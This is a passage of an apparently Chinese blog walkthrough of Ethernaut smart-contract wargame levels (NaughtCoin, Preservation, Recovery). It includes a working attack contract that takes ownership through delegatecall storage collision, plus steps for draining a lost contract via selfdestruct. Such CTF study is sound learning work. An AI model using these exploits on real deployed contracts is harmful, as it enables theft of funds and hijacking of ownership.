timeLock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>但是因为<code>uint public timeLock = block.timestamp + 10 * 365 days;</code></p>\n<p>修饰器对<code>transfer</code>函数进行限定，所以要求无法实现</p>\n<p>了解<code>ERC20</code>之后知道转账除了<code>transfer()</code>函数外还有一种方法，就是<code>approve()</code>和<code>transferFrom()</code>结合使用</p>\n<ul>\n<li>先调用<code>approve()</code>，允许代表所有者<code>spender</code>花费<code>amount</code>的代币数量。</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<ul>\n<li>再调用<code>transferFrom()</code>，将批准的令牌<code>amount</code>从所有者<code>from</code>帐户转移到上一步中批准<code>to</code>的地址中。</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://s2.loli.net/2023/03/24/aLho9jumFSgsVY2.png\" alt=\"image-20230208205631925.png\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意：最后用<code>transferFrom()</code>转账时，要使用被批准账户<code>spender</code>来调用该函数才能成功</p>\n<p><code>override</code>:子合约重写了父合约中的函数，需要加上override关键字。</p></blockquote>\n<h2 id=\"17-Preservation\"><a href=\"#17-Preservation\" class=\"headerlink\" title=\"17.Preservation\"></a>17.Preservation</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Preservation</span> <span class=\"token punctuation\">{</span>\n\n  <span class=\"token comment\">// public library contracts </span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> timeZone1Library<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> timeZone2Library<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span> \n  <span class=\"token builtin\">uint</span> storedTime<span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// Sets the function signature for delegatecall</span>\n  <span class=\"token builtin\">bytes4</span> <span class=\"token keyword\">constant</span> setTimeSignature <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes4</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"setTime(uint256)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _timeZone1LibraryAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _timeZone2LibraryAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    timeZone1Library <span class=\"token operator\">=</span> _timeZone1LibraryAddress<span class=\"token punctuation\">;</span> \n    timeZone2Library <span class=\"token operator\">=</span> _timeZone2LibraryAddress<span class=\"token punctuation\">;</span> \n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n \n  <span class=\"token comment\">// set the time for timezone 1</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">setFirstTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _timeStamp<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    timeZone1Library<span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>setTimeSignature<span class=\"token punctuation\">,</span> _timeStamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token comment\">// set the time for timezone 2</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">setSecondTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _timeStamp<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    timeZone2Library<span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>setTimeSignature<span class=\"token punctuation\">,</span> _timeStamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// Simple library contract to set the time</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">LibraryContract</span> <span class=\"token punctuation\">{</span>\n\n  <span class=\"token comment\">// stores a timestamp </span>\n  <span class=\"token builtin\">uint</span> storedTime<span class=\"token punctuation\">;</span>  \n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">setTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _time<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    storedTime <span class=\"token operator\">=</span> _time<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>题目要求我们取代成为第一个合约的owner</p>\n<p><img src=\"https://s2.loli.net/2023/03/24/7ZTzlRKp8cweGjH.png\" alt=\"image-20230209220709385.png\"></p>\n<p>反编译一手发现owner存储在storage2</p>\n<p>看下能不能尝试改变</p>\n<ul>\n<li><code>Preservation Contract</code></li>\n</ul>\n<p>定义了一些状态变量，其中第一个和第二个变量保存库的地址，第三个变量是我们需要存储地址的所有者。这些地址是在构造函数中预定义的，无法更改。</p>\n<ul>\n<li><p><code>Library Contract</code></p>\n</li>\n<li><p>这定义了一个<code>storedTime</code>在 slot 0 中调用的变量，它映射到<code>address public timeZone1Library</code>保存合约中的变量。</p>\n<p>该函数<code>setTime()</code>接受一个由我们控制并存储在上述变量中的输入。</p>\n</li>\n</ul>\n<p>分析如何修改owner：</p>\n<p>以合同为例。当<code>Preservation</code>合约执行<code>setTime(100)</code>时，它会通过<code>delegatecall</code>调用<code>LibraryContract.setTime(100)</code></p>\n<p><strong>如果<code>LibraryContract</code>修改状态，它不会修改自己的状态，而是修改调用者（<code>Preservation</code>）的状态！</strong></p>\n<p>这意味着当<code>LibraryContract.setTime</code>更新<code>storedTime</code>状态变量时，不是从它自己的合约更新变量，而是更新调用者合约的<strong>slot0</strong>中的变量，即<code>timeZone1Library</code>地址。</p>\n<p>执行<code>setSecondTime</code>函数时会发生同样的事情，它将更新合约<strong>slot0</strong>中的变量。<code>Preservation</code></p>\n<p>攻击合约</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">delegateHack</span><span class=\"token punctuation\">{</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> timeZone1Library<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> timeZone2Library<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n\n  Preservation add<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n      add<span class=\"token operator\">=</span><span class=\"token function\">Preservation</span><span class=\"token punctuation\">(</span>_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">{</span>\n    add<span class=\"token punctuation\">.</span><span class=\"token function\">setFirstTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint160</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    add<span class=\"token punctuation\">.</span><span class=\"token function\">setFirstTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint160</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>add<span class=\"token punctuation\">.</span><span class=\"token function\">owner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span><span class=\"token string\">\"hack failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">setTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _owner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n      owner <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint160</span><span class=\"token punctuation\">(</span>_owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>最后那个<code>setTime</code>函数一开始写成这样是错的：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">setTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">{</span>\n  owner <span class=\"token operator\">=</span> _owner<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>可能是因为和源码的不一样导致owner的地址一直无法改变</p>\n<p>部署一下使用<code>exploit</code>函数即可</p>\n<p><img src=\"https://s2.loli.net/2023/03/24/9HdhLTolVMWJXZO.png\" alt=\"image-20230210125257504.png\"></p>\n<h2 id=\"18-Recovery\"><a href=\"#18-Recovery\" class=\"headerlink\" title=\"18.Recovery\"></a>18.Recovery</h2><h3 id=\"create和create2（在之前写的solidity进阶里面有）\"><a href=\"#create和create2（在之前写的solidity进阶里面有）\" class=\"headerlink\" title=\"create和create2（在之前写的solidity进阶里面有）\"></a><code>create</code>和<code>create2</code>（在之前写的solidity进阶里面有）</h3><p>在合约中创建新合约</p>\n<p><img src=\"https://s2.loli.net/2023/03/24/3jF1ugPYMpNXWDw.png\" alt=\"image-20230319111508702.png\"></p>\n<h3 id=\"以太坊合约的地址计算（https-ethereum-stackexchange-com-questions-760-how-is-the-address-of-an-ethereum-contract-computed-761-761）\"><a href=\"#以太坊合约的地址计算（https-ethereum-stackexchange-com-questions-760-how-is-the-address-of-an-ethereum-contract-computed-761-761）\" class=\"headerlink\" title=\"以太坊合约的地址计算（https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed/761#761）\"></a>以太坊合约的地址计算（<a href=\"https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed/761#761）\">https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed/761#761）</a></h3><p>以太坊合约的地址是根据其创建者的地址 ( ) 和创建者发送的交易数量 ( )<strong>确定性计算的。</strong> The <code>sender</code> and <code>nonce</code> are RLP encoded and then <strong>hashed with Keccak-256</strong>.</p>\n<p>在<code>solidity</code>中：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">//  nonce 为 0 时生成的地址</span>\nnonce0<span class=\"token operator\">=</span> \n<span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint160</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes1</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes1</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x94</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _origin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes1</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nnonce1<span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint160</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes1</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes1</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x94</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _origin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes1</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x01</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意：在这题中</p>\n<ul>\n<li>发送者<code>_origin</code>是<code>Recover</code>合约本身</li>\n<li>nonce 是合约本身创建的合约编号。需要记住的重要一点：合约的随机数<strong>从 1 而不是 0</strong> 开始！</li>\n</ul></blockquote>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">locate</span><span class=\"token punctuation\">{</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> lostaddr <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint160</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes1</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes1</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x94</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xe28517966fff65C678F1393b121ABF262A7Df53D</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes1</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x01</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意：<code>address(0xe28517966fff65C678F1393b121ABF262A7Df53D\n)</code>是本题中的发送者。</p></blockquote>\n<p><img src=\"https://s2.loli.net/2023/03/24/uSrsqUpnGdNTZXH.png\" alt=\"image-20230319114925230.png\"></p>\n<p>得到的这个地址把他拿到区块链浏览器上看看来源</p>\n<p><img src=\"https://s2.loli.net/2023/03/24/76aB29qlQO3gGuZ.png\" alt=\"image-20230319115023581.png\"></p>\n<p><img src=\"https://s2.loli.net/2023/03/24/FMUSWvXzG2d5Imp.png\" alt=\"image-20230319115034341.png\"></p>\n<p>确定是丢失的地址</p>\n<p>部署该地址的<code>Recover</code>合约，并且调用<code>selfdestruct</code>函数把钱转走就完成了</p>\n<p><img src=\"https://s2.loli.net/2023/03/24/o2EJm1ytZAUjzpc.png\" alt=\"image-20230319115140212.png\"></p>\n","text":"Ethernaut1.Hello建立MetaMask账号连接一下按F12打开浏览器的控制台，输入help() 使用命令getBalance(player)查询账户余额，显示pending，可以展开看（或者使用await getBalance(player)） ethernaut合...","link":"","photos":[],"count_time":{"symbolsCount":"50k","symbolsTime":"46 mins."},"categories":[],"tags":[{"name":"solidity靶场","slug":"solidity靶场","count":2,"path":"api/tags/solidity靶场.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Ethernaut\"><span class=\"toc-text\">Ethernaut</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-Hello\"><span class=\"toc-text\">1.Hello</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-Fallback\"><span class=\"toc-text\">2.Fallback</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-Fallout\"><span class=\"toc-text\">3.Fallout</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4-Coin-Flip\"><span class=\"toc-text\">4.Coin Flip</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Tip%EF%BC%9A%E5%86%99%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">Tip：写攻击合约的两种方式</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5-Telephone\"><span class=\"toc-text\">5.Telephone</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#6-Token\"><span class=\"toc-text\">6.Token</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#7-Delegation%EF%BC%88%E5%A4%9A%E6%83%B3%E6%83%B3%EF%BC%89\"><span class=\"toc-text\">7.Delegation（多想想）</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#8-Force\"><span class=\"toc-text\">8.Force</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#9-Vault\"><span class=\"toc-text\">9.Vault</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#10-King\"><span class=\"toc-text\">10.King</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#11-Re-entrancy\"><span class=\"toc-text\">11.Re-entrancy</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#12-Elevator\"><span class=\"toc-text\">12.Elevator</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#13-Privacy\"><span class=\"toc-text\">13.Privacy</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E5%8F%8D%E7%BC%96%E8%AF%91%E5%86%85%E5%AE%B9\"><span class=\"toc-text\">查看反编译内容</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" 